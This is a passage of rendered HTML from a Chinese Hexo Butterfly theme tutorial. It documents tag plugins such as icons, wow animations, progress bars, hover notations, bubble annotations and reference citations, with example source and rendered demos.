id="分栏-2"><ol><li><code>icon-xxxx</code>：表示图标<code>font-class</code>,可以在自己的阿里矢量图标库项目的<code>font-class</code>引用方案内查询并复制。</li><li><code>font-size</code>：表示图标大小，直接填写数字即可，单位为<code>em</code>。图标大小默认值为<code>1em</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon icon-rat<span class="emphasis">_zi %&#125;&#123;% icon icon-rat,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-ox_</span>chou,3 %&#125;&#123;% icon icon-ox,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-tiger<span class="emphasis">_yin,5 %&#125;&#123;% icon icon-tiger,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rabbit_</span>mao,1 %&#125;&#123;% icon icon-rabbit,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dragon<span class="emphasis">_chen,3 %&#125;&#123;% icon icon-dragon,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-snake_</span>si,5 %&#125;&#123;% icon icon-snake,6 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-horse<span class="emphasis">_wu %&#125;&#123;% icon icon-horse,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-goat_</span>wei,3 %&#125;&#123;% icon icon-goat,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-monkey<span class="emphasis">_shen,5 %&#125;&#123;% icon icon-monkey,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rooster_</span>you %&#125;&#123;% icon icon-rooster,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dog<span class="emphasis">_xu,3 %&#125;&#123;% icon icon-dog,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-boar_</span>hai,5 %&#125;&#123;% icon icon-boar,6 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rat_zi"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rat"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-ox_chou"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-ox"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-tiger_yin"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-tiger"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rabbit_mao"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rabbit"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dragon_chen"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dragon"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-snake_si"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-snake"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-horse_wu"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-horse"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-goat_wei"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-goat"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-monkey_shen"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-monkey"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rooster_you"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rooster"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dog_xu"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dog"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-boar_hai"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-boar"></use></svg></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-24-特效标签wow">2.24 特效标签wow</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow [animete],[duration],[delay],[offset],[iteration] %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endwow %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>animate</code>: 动画样式，效果详见<a href="https://animate.style/">animate.css参考文档</a></li><li><code>duration</code>: 选填项，动画持续时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>delay</code>: 选填项，动画开始的延迟时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>offset</code>: 选填项，开始动画的距离（相对浏览器底部）</li><li><code>iteration</code>: 选填项，动画重复的次数</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.flip动画效果。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>2.zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复10次</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>3.slideInRight动画效果，持续5s，延时5s</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__slideInRight,5s,5s %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note orange &#x27;fas fa-car&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`slideInRight`动画效果，持续`5s`，延时`5s`。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>4.heartBeat动画效果，延时5s，重复10次。此处注意不用的参数位置要留空，用逗号间隔。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__heartBeat,,5s,,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note red &#x27;fas fa-battery-half&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`heartBeat`动画效果，延时`5s`，重复`10`次。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.flip动画效果。</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次</p></div></div><p>2.zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复10次</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次</p></div></div><p>3.slideInRight动画效果，持续5s，延时5s</p><div class='wow animate__slideInRight' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='' ><div class="note orange icon-padding modern"><i class="note-icon fas fa-car"></i><p><code>slideInRight</code>动画效果，持续<code>5s</code>，延时<code>5s</code>。</p></div></div><p>4.heartBeat动画效果，延时5s，重复10次。此处注意不用的参数位置要留空，用逗号间隔。</p><div class='wow animate__heartBeat' data-wow-duration='' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='10' ><div class="note red icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p><code>heartBeat</code>动画效果，延时<code>5s</code>，重复<code>10</code>次。</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-25-进度条-progress">2.25  进度条 progress</h2><div class="note info flat"><p>进度条标签参考<a href="https://rongbuqiu.com/jdt.html">沂佰孜猫-给HEXO文章添加彩色进度条</a>。<br>源样式提取自<a href="https://zwying0814.gitbook.io/cuteen/">Cuteen</a>主题。</p></div><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress [width] [color] [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>width</code>: 0到100的阿拉伯数字</li><li><code>color</code>: 颜色，取值有red,yellow,green,cyan,blue,gray</li><li><code>text</code>:进度条上的文字内容</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress 10 red 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 30 yellow 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 50 green 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 70 cyan 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 90 blue 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 100 gray 进度条样式预览 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-red"  style="width: 10%" aria-valuenow="10" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-yellow"  style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-green"  style="width: 50%" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-cyan"  style="width: 70%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 90%" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-gray"  style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-26-注释-notation">2.26 注释 notation</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota [label] , [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p><code>label</code>: 注释词汇</p></li><li><p><code>text</code>: 悬停显示的注解内容</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota 把鼠标移动到我上面试试 ,可以看到注解内容出现在顶栏 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><span class='nota' data-nota='可以看到注解内容出现在顶栏'>把鼠标移动到我上面试试</span></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-27-气泡注释-bubble">2.27 气泡注释 bubble</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bubble [content] , [notation] ,[background-color] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>content</code>: 注释词汇</li><li><code>notation</code>: 悬停显示的注解内容</li><li><code>background-color</code>: 可选，气泡背景色。默认为“#71a4e3”</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如CSS的&#123;% bubble 兄弟相邻选择器,&quot;例如 h1 + p &#123;margin-top:50px;&#125;&quot; %&#125;，&#123;% bubble flex布局,&quot;Flex 是 Flexible Box 的缩写，意为&quot;弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;,&quot;#ec5830&quot; %&#125;，&#123;% bubble transform变换,&quot;transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。&quot;,&quot;#1db675&quot; %&#125;，animation的&#123;% bubble 贝塞尔速度曲线,&quot;贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋&quot;,&quot;#de4489&quot; %&#125;写法，还有今天刚看到的&#123;% bubble clip-path,&quot;clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。&quot;,&quot;#868fd7&quot; %&#125;属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如CSS的<span class="bubble-content">兄弟相邻选择器</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#71a4e3;">例如 h1 + p {margin-top:50px;}</span></span>，<span class="bubble-content">flex布局</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#ec5830;">Flex 是 Flexible Box 的缩写，意为弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;</span></span>，<span class="bubble-content">transform变换</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#1db675;">transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。</span></span>，animation的<span class="bubble-content">贝塞尔速度曲线</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#de4489;">贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋</span></span>写法，还有今天刚看到的<span class="bubble-content">clip-path</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。</span></span>属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-28-引用文献-reference">2.28 引用文献 reference</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% referto [id] , [literature] %&#125;</span><br><span class="line">&#123;% referfrom [id] , [literature] , [url] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>referto 引用上标</p><ul><li><p><code>id</code>: 上标序号内容，需与referfrom标签的id对应才能实现跳转</p></li><li><p><code>literature</code>: 引用的参考文献名称</p></li></ul></li><li><p>referfrom 引用出处</p><ul><li><p><code>id</code>: 序号内容，需与referto标签的id对应才能实现 跳转</p></li><li><p><code>literature</code>: 引用的参考文献名称</p></li><li><p><code>url</code>: 引用的参考文献链接，可省略</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Akilarの糖果屋(akilar.top)是一个私人性质的博客&#123;% referto &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27; %&#125;，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用Hexo框架&#123;% referto &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27; %&#125;，Butterfly主题&#123;% referto &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">本项目参考了Volantis&#123;% referto &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27; %&#125;的标签样式。引入<span class="code">`[tag].js`</span>，并针对<span class="code">`butterfly`</span>主题修改了相应的<span class="code">`[tag].styl`</span>。在此鸣谢<span class="code">`Volantis`</span>主题众开发者。</span><br><span class="line">主要参考内容包括各个volantis的内置标签插件文档&#123;% referto &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27; %&#125;</span><br><span class="line">Butterfly主题的各个衍生魔改&#123;% referto &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27; %&#125;&#123;% referto &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27; %&#125;&#123;% referto &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27; %&#125;&#123;% referto &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% referfrom &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27;,&#x27;https://jq.qq.com/?<span class="emphasis">_wv=1027&amp;k=pGLB2C0N&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27;,&#x27;https://hexo.io/zh-cn/docs/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27;,&#x27;https://butterfly.js.org/posts/21cfbf15/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27;,&#x27;https://volantis.js.org/v5/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27;,&#x27;https://volantis.js.org/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27;,&#x27;https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27;,&#x27;https://lovelijunyi.gitee.io/posts/c898.html&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27;,&#x27;https://github.com/l-lin/font-awesome-animation&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27;,&#x27;https://www.antmoe.com/posts/3b43914f/&#x27; %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>Akilarの糖果屋(akilar.top)是一个私人性质的博客<span class="hidden-anchor" id="referto_[1]"></span><sup class="reference"><a href="#referfrom_[1]">[1]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Akilarの糖果屋群聊简介</span><span class="reference-title">参考资料</span></span></span>，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用Hexo框架<span class="hidden-anchor" id="referto_[2]"></span><sup class="reference"><a href="#referfrom_[2]">[2]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Hexo中文文档</span><span class="reference-title">参考资料</span></span></span>，Butterfly主题<span class="hidden-anchor" id="referto_[3]"></span><sup class="reference"><a href="#referfrom_[3]">[3]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档(一) 快速开始</span><span class="reference-title">参考资料</span></span></span></p><p>本项目参考了Volantis<span class="hidden-anchor" id="referto_[4]"></span><sup class="reference"><a href="#referfrom_[4]">[4]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">hexo-theme-volantis 标签插件</span><span class="reference-title">参考资料</span></span></span>的标签样式。引入<code>[tag].js</code>，并针对<code>butterfly</code>主题修改了相应的<code>[tag].styl</code>。在此鸣谢<code>Volantis</code>主题众开发者。<br>主要参考内容包括各个volantis的内置标签插件文档<span class="hidden-anchor" id="referto_[5]"></span><sup class="reference"><a href="#referfrom_[5]">[5]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Volantis文档:内置标签插件</span><span class="reference-title">参考资料</span></span></span><br>Butterfly主题的各个衍生魔改<span class="hidden-anchor" id="referto_[6]"></span><sup class="reference"><a href="#referfrom_[6]">[6]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档:标签外挂（Tag Plugins</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[7]"></span><sup class="reference"><a href="#referfrom_[7]">[7]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小弋の生活馆全样式预览</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[8]"></span><sup class="reference"><a href="#referfrom_[8]">[8]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">l-lin-font-awesome-animation</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[9]"></span><sup class="reference"><a href="#referfrom_[9]">[9]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小康的butterfly主题使用文档</span><span class="reference-title">参考资料</span></span></span></p><div class="reference-source"><span class="hidden-anchor" id="referfrom_[1]"></span><a class="reference-anchor" href="#referto_[1]">[1]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://jq.qq.com/?_wv=1027&k=pGLB2C0N">Akilarの糖果屋群聊简介</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[2]"></span><a class="reference-anchor" href="#referto_[2]">[2]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://hexo.io/zh-cn/docs/">Hexo中文文档</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[3]"></span><a class="reference-anchor" href="#referto_[3]">[3]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 安装文档(一) 快速开始</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[4]"></span><a class="reference-anchor" href="#referto_[4]">[4]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/v5/tag-plugins/">hexo-theme-volantis 标签插件</a></div><div class="reference-source"><span 